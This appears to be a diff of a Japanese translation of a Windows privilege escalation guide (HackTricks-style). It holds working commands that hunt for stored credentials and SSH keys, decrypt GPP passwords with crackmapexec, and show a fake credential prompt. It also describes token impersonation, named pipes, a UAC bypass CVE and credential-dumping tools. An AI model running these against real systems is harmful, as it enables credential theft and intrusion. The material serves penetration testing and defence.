-インストーラーは **SYSTEM 権限で実行され**、多くは **DLL サイドローディングに脆弱です (情報元: ** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**)。**
+`C:\Windows\CCM\SCClient.exe` が存在するか確認してください。\
+インストーラーは **SYSTEM 権限で実行され**、多くは **DLL サイドローディングに脆弱です（情報は** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**
 ```bash
 $result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
 if ($result) { $result }
@@ -920,7 +920,7 @@ SSHプライベートキーはレジストリキー `HKCU\Software\OpenSSH\Agent
 reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
 ```
 そのパス内にエントリが見つかった場合、それはおそらく保存されたSSHキーです。これは暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)を使用して簡単に復号化できます。\
-この技術に関する詳細情報はここにあります: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
+この技術に関する詳細情報はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
 `ssh-agent`サービスが実行されていない場合、自動的に起動するようにするには、次のコマンドを実行します:
 ```bash
@@ -973,7 +973,7 @@ dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>n
 %SYSTEMROOT%\System32\config\SYSTEM
 %SYSTEMROOT%\System32\config\RegBack\system
 ```
-### クラウド資格情報
+### クラウド認証情報
 ```bash
 #From user home
 .aws\credentials
@@ -989,7 +989,7 @@ AppData\Roaming\gcloud\access_tokens.db
 
 ### Cached GPP Pasword
 
-以前は、グループポリシープリファレンス（GPP）を介して、複数のマシンにカスタムローカル管理者アカウントを展開する機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOLにXMLファイルとして保存されているグループポリシーオブジェクト（GPO）は、任意のドメインユーザーによってアクセス可能でした。次に、これらのGPP内のパスワードは、公開文書化されたデフォルトキーを使用してAES256で暗号化されており、認証されたユーザーによって復号化可能でした。これは、ユーザーが特権を昇格させる可能性があるため、深刻なリスクをもたらしました。
+以前は、グループポリシープリファレンス（GPP）を介して一群のマシンにカスタムローカル管理者アカウントを展開する機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOLにXMLファイルとして保存されているグループポリシーオブジェクト（GPO）は、任意のドメインユーザーによってアクセス可能でした。次に、これらのGPP内のパスワードは、公開文書化されたデフォルトキーを使用してAES256で暗号化されており、認証されたユーザーによって復号化可能でした。これは、ユーザーが特権を昇格させる可能性があるため、深刻なリスクをもたらしました。
 
 このリスクを軽減するために、「cpassword」フィールドが空でないローカルキャッシュされたGPPファイルをスキャンする機能が開発されました。このようなファイルが見つかると、関数はパスワードを復号化し、カスタムPowerShellオブジェクトを返します。このオブジェクトには、GPPに関する詳細とファイルの場所が含まれており、このセキュリティ脆弱性の特定と修正に役立ちます。
 
@@ -1012,16 +1012,16 @@ crackmapexecを使用してパスワードを取得する:
 crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
 ```
 ### IIS Web Config
-```powershell
+```bash
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
 
-```powershell
+```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 C:\inetpub\wwwroot\web.config
 ```
 
-```powershell
+```bash
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
@@ -1065,7 +1065,7 @@ Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAct
 ```
 ### Ask for credentials
 
-You can always **ask the user to enter his credentials of even the credentials of a different user** if you think he can know them (notice that **asking** the client directly for the **credentials** is really **risky**):
+ユーザーに自分の資格情報や、他のユーザーの資格情報を入力するように**頼むことができます**。彼がそれを知っていると思う場合は特にそうです（**資格情報**を直接クライアントに**尋ねることは本当に**リスクが高いことに注意してください）：
 ```bash
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
@@ -1179,9 +1179,9 @@ reg query "HKCU\Software\OpenSSH\Agent\Key"
 
 ### **COM DLLの上書き**
 
-**コンポーネントオブジェクトモデル (COM)** は、異なる言語のソフトウェアコンポーネント間の**相互通信**を可能にするWindowsオペレーティングシステム内に構築された技術です。各COMコンポーネントは**クラスID (CLSID)**によって**識別され**、各コンポーネントはインターフェースID (IIDs)によって識別される1つ以上のインターフェースを介して機能を公開します。
+**コンポーネントオブジェクトモデル (COM)** は、異なる言語のソフトウェアコンポーネント間の**相互通信**を可能にするWindowsオペレーティングシステム内に構築された技術です。各COMコンポーネントは**クラスID (CLSID)**によって識別され、各コンポーネントはインターフェースID (IIDs)によって識別される1つ以上のインターフェースを介して機能を公開します。
 
-COMクラスとインターフェースは、それぞれ**HKEY\_**_**CLASSES\_**_**ROOT\CLSID**および**HKEY\_**_**CLASSES\_**_**ROOT\Interface**のレジストリに定義されています。このレジストリは、**HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT**をマージすることによって作成されます。
+COMクラスとインターフェースは、それぞれ**HKEY\CLASSES\ROOT\CLSID**および**HKEY\CLASSES\ROOT\Interface**のレジストリに定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT**をマージすることによって作成されます。
 
 このレジストリのCLSID内には、**DLL**を指す**デフォルト値**を含む子レジストリ**InProcServer32**があり、**ThreadingModel**という値があり、これは**Apartment**（シングルスレッド）、**Free**（マルチスレッド）、**Both**（シングルまたはマルチ）、または**Neutral**（スレッド中立）である可能性があります。
 
@@ -1203,7 +1203,7 @@ cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*
 ```
-**特定のファイル名のファイルを検索する**
+**特定のファイル名を持つファイルを検索する**
 ```bash
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 where /R C:\ user.txt
@@ -1218,40 +1218,44 @@ REG QUERY HKCU /F "password" /t REG_SZ /S /d
 ```
 ### パスワードを検索するツール
 
-[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **はmsfの** プラグインで、**被害者の内部で資格情報を検索するすべてのmetasploit POSTモジュールを自動的に実行するために作成しました。**\
+[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **はmsfの**プラグインで、**被害者の内部で資格情報を検索するすべてのmetasploit POSTモジュールを自動的に実行するために作成しました。**\
 [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページに記載されているパスワードを含むすべてのファイルを自動的に検索します。\
 [**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出するためのもう一つの優れたツールです。
 
-ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、**セッション**、**ユーザー名**、および**パスワード**を検索します。これらは、クリアテキストでデータを保存するいくつかのツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）によって保存されます。
+ツール[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)は、**セッション**、**ユーザー名**、および**パスワード**を検索します。これらは、クリアテキストでデータを保存するいくつかのツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）によって保存されます。
 ```bash
 Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -Thorough
 Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
-## Leaked Handlers
+## 漏洩ハンドラ
 
-想像してみてください、**SYSTEMとして実行されているプロセスが新しいプロセスを開く** (`OpenProcess()`) **フルアクセスで**。同じプロセスが**低い権限で新しいプロセスを作成し** (`CreateProcess()`) **メインプロセスのすべてのオープンハンドルを継承します**。\
-その後、**低い権限のプロセスにフルアクセスがある場合**、`OpenProcess()`で作成された**特権プロセスへのオープンハンドルを取得し**、**シェルコードを注入**できます。\
+**SYSTEMとして実行されているプロセスが新しいプロセスを開く** (`OpenProcess()`) **と、完全なアクセス権を持つ**。同じプロセスが**低い権限で新しいプロセスを作成し** (`CreateProcess()`) **、メインプロセスのすべてのオープンハンドルを継承する**。\
+その後、**低い権限のプロセスに完全なアクセス権がある場合**、`OpenProcess()`で作成された**特権プロセスへのオープンハンドルを取得し**、**シェルコードを注入**できます。\
 [この例を読んで、**この脆弱性を検出し、悪用する方法についての詳細情報を得てください**。](leaked-handle-exploitation.md)\
-[この**別の投稿を読んで、異なる権限レベル（フルアクセスだけでなく）で継承されたプロセスとスレッドのオープンハンドルをテストし、悪用する方法についてのより完全な説明を得てください**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)。
+[この**別の投稿を読んで、異なる権限レベル（完全なアクセスだけでなく）で継承されたプロセスとスレッドのオープンハンドルをテストし、悪用する方法についてのより完全な説明を得てください**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)。
 
-## Named Pipe Client Impersonation
+## 名前付きパイプクライアントの偽装
 
-共有メモリセグメント、いわゆる**パイプ**は、プロセス間の通信とデータ転送を可能にします。
+共有メモリセグメント、すなわち**パイプ**は、プロセス間の通信とデータ転送を可能にします。
 
-Windowsは**Named Pipes**と呼ばれる機能を提供しており、無関係なプロセスが異なるネットワークを越えてデータを共有できます。これはクライアント/サーバーアーキテクチャに似ており、役割は**named pipe server**と**named pipe client**として定義されます。
+Windowsは**名前付きパイプ**という機能を提供しており、無関係なプロセスが異なるネットワークを介してデータを共有できます。これは、**名前付きパイプサーバー**と**名前付きパイプクライアント**として定義された役割を持つクライアント/サーバーアーキテクチャに似ています。
 
-**クライアント**によってパイプを通じてデータが送信されると、パイプを設定した**サーバー**は**クライアントのアイデンティティを引き受ける**能力を持ちます。必要な**SeImpersonate**権限がある場合です。パイプを介して通信する**特権プロセス**を特定し、そのプロセスのアイデンティティを模倣する機会があり、あなたが確立したパイプと相互作用する際にそのプロセスのアイデンティティを採用することで**より高い権限を得る**ことができます。このような攻撃を実行するための指示は、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)で見つけることができます。
+**クライアント**によってパイプを通じてデータが送信されると、パイプを設定した**サーバー**は、必要な**SeImpersonate**権限を持っている場合、**クライアントのアイデンティティを引き受ける**ことができます。パイプを介して通信する**特権プロセス**を特定し、そのアイデンティティを模倣する機会があり、あなたが確立したパイプと相互作用する際にそのプロセスのアイデンティティを採用することで**より高い権限を得る**ことができます。このような攻撃を実行するための手順については、役立つガイドが[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)にあります。
 
-また、次のツールは**burpのようなツールでnamed pipe通信を傍受することを可能にします**：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **このツールは、特権昇格を見つけるためにすべてのパイプをリストし、表示することを可能にします** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
+また、次のツールは、**burpのようなツールで名前付きパイプ通信を傍受する**ことを可能にします：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **このツールは、特権昇格を見つけるためにすべてのパイプをリストし、表示することを可能にします** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
-## Misc
+## その他
+
+### Windowsで実行可能なファイル拡張子
+
+ページを確認してください **[https://filesec.io/](https://filesec.io/)**
 
 ### **パスワードのためのコマンドラインの監視**
 
-ユーザーとしてシェルを取得すると、**コマンドラインで資格情報を渡す**スケジュールされたタスクや他のプロセスが実行されている可能性があります。以下のスクリプトは、プロセスのコマンドラインを2秒ごとにキャプチャし、現在の状態と前の状態を比較して、違いを出力します。
-```powershell
+ユーザーとしてシェルを取得すると、**コマンドラインで資格情報を渡す**スケジュールされたタスクや他のプロセスが実行されることがあります。以下のスクリプトは、プロセスのコマンドラインを2秒ごとにキャプチャし、現在の状態を前の状態と比較して、違いを出力します。
+```bash
 while($true)
 {
 $process = Get-WmiObject Win32_Process | Select-Object CommandLine
@@ -1266,7 +1270,7 @@ Compare-Object -ReferenceObject $process -DifferenceObject $process2
 
 グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、特権のないユーザーから「NT\AUTHORITY SYSTEM」などのターミナルや他のプロセスを実行することが可能です。
 
-これにより、特権を昇格させ、同時に同じ脆弱性で UAC をバイパスすることができます。さらに、何かをインストールする必要はなく、プロセス中に使用されるバイナリは Microsoft によって署名され、発行されています。
+これにより、特権を昇格させ、同時に同じ脆弱性で UAC をバイパスすることができます。さらに、何もインストールする必要がなく、プロセス中に使用されるバイナリは Microsoft によって署名され、発行されています。
 
 影響を受けるシステムの一部は以下の通りです：
 ```
@@ -1312,7 +1316,7 @@ Windows 10 1709	16299	link NOT opened
 
 https://github.com/jas502n/CVE-2019-1388
 
-## 管理者の中程度から高い整合性レベル / UACバイパスへ
+## 管理者の中程度から高い整合性レベル / UACバイパス
 
 **整合性レベルについて学ぶには、これを読んでください：**
 
@@ -1330,54 +1334,57 @@ integrity-levels.md
 
 ### **新しいサービス**
 
-すでに高い整合性プロセスで実行している場合、**SYSTEMにパスする**のは、**新しいサービスを作成して実行する**だけで簡単です：
+すでに高い整合性プロセスで実行している場合、**SYSTEMへのパス**は**新しいサービスを作成して実行する**だけで簡単にできます：
 ```
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
 ```
+> [!NOTE]
+> サービスバイナリを作成する際は、それが有効なサービスであるか、バイナリが必要なアクションを迅速に実行することを確認してください。そうでない場合、20秒以内に終了します。
+
 ### AlwaysInstallElevated
 
-High Integrity プロセスから、**AlwaysInstallElevated レジストリエントリを有効にし**、_**.msi**_ ラッパーを使用してリバースシェルを**インストール**しようとすることができます。\
-[関与するレジストリキーと _.msi_ パッケージのインストール方法についての詳細はこちら。](#alwaysinstallelevated)
+高い整合性のプロセスから、**AlwaysInstallElevatedレジストリエントリを有効にし**、_**.msi**_ラッパーを使用してリバースシェルを**インストール**しようとすることができます。\
+[関与するレジストリキーと_.msi_パッケージのインストール方法についての詳細はこちら。](#alwaysinstallelevated)
 
-### High + SeImpersonate privilege to System
+### High + SeImpersonate特権をSystemに
 
-**コードは** [**こちらで見つけることができます**](seimpersonate-from-high-to-system.md)**。**
+**コードは** [**こちらにあります**](seimpersonate-from-high-to-system.md)**。**
 
-### From SeDebug + SeImpersonate to Full Token privileges
+### SeDebug + SeImpersonateからフルトークン特権へ
 
-これらのトークン権限を持っている場合（おそらくすでに High Integrity プロセスで見つけることができるでしょう）、**ほぼすべてのプロセス**（保護されたプロセスではない）を SeDebug 権限で**開くことができ**、プロセスの**トークンをコピー**し、そのトークンを使用して**任意のプロセスを作成**することができます。\
-この技術を使用する際は、通常、**すべてのトークン権限を持つ SYSTEM として実行されている任意のプロセスを選択します**（_はい、すべてのトークン権限を持たない SYSTEM プロセスを見つけることができます_）。\
-**提案された技術を実行するコードの** [**例はこちらで見つけることができます**](sedebug-+-seimpersonate-copy-token.md)**。**
+これらのトークン特権を持っている場合（おそらくすでに高い整合性のプロセスで見つけるでしょう）、**ほぼすべてのプロセス**（保護されたプロセスではない）をSeDebug特権で**開くことができ**、プロセスの**トークンをコピー**し、そのトークンを使用して**任意のプロセスを作成**することができます。\
+この技術を使用する際は、通常、**すべてのトークン特権を持つSYSTEMとして実行されている任意のプロセスを選択します**（_はい、すべてのトークン特権を持たないSYSTEMプロセスを見つけることができます_）。\
+**提案された技術を実行するコードの** [**例はこちらにあります**](sedebug-+-seimpersonate-copy-token.md)**。**
 
-### **Named Pipes**
+### **名前付きパイプ**
 
-この技術は、meterpreter が `getsystem` で昇格するために使用します。この技術は、**パイプを作成し、そのパイプに書き込むサービスを作成/悪用する**ことから成ります。次に、**`SeImpersonate`** 権限を使用してパイプを作成した**サーバー**は、パイプクライアント（サービス）の**トークンを偽装**し、SYSTEM 権限を取得することができます。\
+この技術は、meterpreterが`getsystem`で昇格するために使用します。この技術は、**パイプを作成し、そのパイプに書き込むサービスを作成/悪用する**ことから成ります。次に、**`SeImpersonate`**特権を使用してパイプを作成した**サーバー**は、パイプクライアント（サービス）の**トークンを偽装**してSYSTEM特権を取得することができます。\
 名前付きパイプについて[**もっと学びたい場合はこれを読むべきです**](#named-pipe-client-impersonation)。\
-High Integrity から SYSTEM へ名前付きパイプを使用して移行する[**方法の例を読みたい場合はこれを読むべきです**](from-high-integrity-to-system-with-name-pipes.md)。
+高い整合性からSYSTEMに名前付きパイプを使用して移行する[**方法の例を読みたい場合はこれを読むべきです**](from-high-integrity-to-system-with-name-pipes.md)。
 
-### Dll Hijacking
+### Dllハイジャック
 
-**SYSTEM** として実行されている**プロセス**によって**ロードされる dll をハイジャック**することができれば、その権限で任意のコードを実行することができます。したがって、Dll Hijacking はこの種の権限昇格にも役立ち、さらに、**High Integrity プロセスからはるかに達成しやすい**です。なぜなら、dll をロードするために使用されるフォルダーに**書き込み権限**を持っているからです。\
-**Dll hijacking についてもっと学ぶことができます** [**こちら**](dll-hijacking/index.html)**。**
+**SYSTEM**として実行されている**プロセス**によって**ロードされるdllをハイジャック**することができれば、その権限で任意のコードを実行することができます。したがって、Dllハイジャックはこの種の特権昇格にも役立ち、さらに、高い整合性のプロセスからは**はるかに達成しやすい**です。なぜなら、dllをロードするために使用されるフォルダに**書き込み権限**を持っているからです。\
+**Dllハイジャックについて** [**こちらで詳しく学ぶことができます**](dll-hijacking/index.html)**。**
 
-### **From Administrator or Network Service to System**
+### **管理者またはネットワークサービスからSYSTEMへ**
 
-{{#ref}}
-https://github.com/sailay1996/RpcSsImpersonator
-{{#endref}}
+- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
+- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
+- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)
 
-### From LOCAL SERVICE or NETWORK SERVICE to full privs
+### LOCAL SERVICEまたはNETWORK SERVICEからフル特権へ
 
-**読む:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
+**読むべき:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
 
-## More help
+## さらなるヘルプ
 
-[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)
+[静的インパケットバイナリ](https://github.com/ropnop/impacket_static_binaries)
 
-## Useful tools
+## 有用なツール
 
-**Windows ローカル権限昇格ベクトルを探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+**Windowsローカル特権昇格ベクターを探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
 **PS**
 
@@ -1385,37 +1392,37 @@ https://github.com/sailay1996/RpcSsImpersonator
 [**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルをチェックします (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。検出されました。**\
 [**JAWS**](https://github.com/411Hall/JAWS) **-- 一部の設定ミスをチェックし、情報を収集します (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。**\
 [**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェックします**\
-[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP の保存されたセッション情報を抽出します。ローカルで -Thorough を使用します。**\
-[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から資格情報を抽出します。検出されました。**\
+[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPの保存されたセッション情報を抽出します。ローカルで-Thoroughを使用します。**\
+[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 資格情報マネージャーから資格情報を抽出します。検出されました。**\
 [**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン全体にスプレーします**\
-[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell ADIDNS/LLMNR/mDNS/NBNS スプーフィングおよび中間者攻撃ツールです。**\
-[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な privesc Windows 列挙**\
-[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 既知の privesc 脆弱性を検索します（非推奨）\
+[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShellのADIDNS/LLMNR/mDNS/NBNSスプーフィングおよび中間者ツールです。**\
+[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な特権昇格のWindows列挙**\
+[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 既知の特権昇格の脆弱性を検索します（Watsonのために非推奨）\
 [~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(管理者権限が必要)**
 
 **Exe**
 
-[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc 脆弱性を検索します（VisualStudio を使用してコンパイルする必要があります） ([**事前コンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
-[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 設定ミスを探すためにホストを列挙します（privesc よりも情報収集ツールに近い）（コンパイルが必要） **(**[**事前コンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
-[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのソフトウェアから資格情報を抽出します（GitHub に事前コンパイル済み exe）**\
-[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# へのポート**\
-[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 設定ミスをチェックします（GitHub に事前コンパイル済みの実行可能ファイル）。推奨されません。Win10 ではうまく機能しません。\
-[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な設定ミスをチェックします（Python からの exe）。推奨されません。Win10 ではうまく機能しません。
+[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の特権昇格の脆弱性を検索します（VisualStudioを使用してコンパイルする必要があります） ([**事前コンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
+[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 設定ミスを探してホストを列挙します（特権昇格よりも情報収集ツールです）（コンパイルが必要） **(**[**事前コンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
+[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのソフトウェアから資格情報を抽出します（GitHubに事前コンパイル済みexeあり）**\
+[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#へのポート**\
+[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 設定ミスをチェックします（GitHubに事前コンパイル済みの実行可能ファイル）。推奨されません。Win10ではうまく動作しません。\
+[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な設定ミスをチェックします（Pythonからのexe）。推奨されません。Win10ではうまく動作しません。
 
 **Bat**
 
-[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿に基づいて作成されたツール（正しく動作するために accesschk は必要ありませんが、使用することができます）。
+[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿に基づいて作成されたツール（正しく動作するためにaccesschkは必要ありませんが、使用することができます）。
 
-**Local**
+**ローカル**
 
-[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、動作するエクスプロイトを推奨します（ローカル Python）\
-[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、動作するエクスプロイトを推奨します（ローカル Python）
+[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するエクスプロイトを推奨します（ローカルPython）\
+[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するエクスプロイトを推奨します（ローカルPython）
 
 **Meterpreter**
 
 _multi/recon/local_exploit_suggestor_
 
-プロジェクトを正しいバージョンの .NET を使用してコンパイルする必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている .NET のバージョンを確認するには、次のようにします：
+プロジェクトを正しいバージョンの.NETを使用してコンパイルする必要があります（[これを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている.NETのバージョンを確認するには、次のようにします：
 ```
 C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
 ```
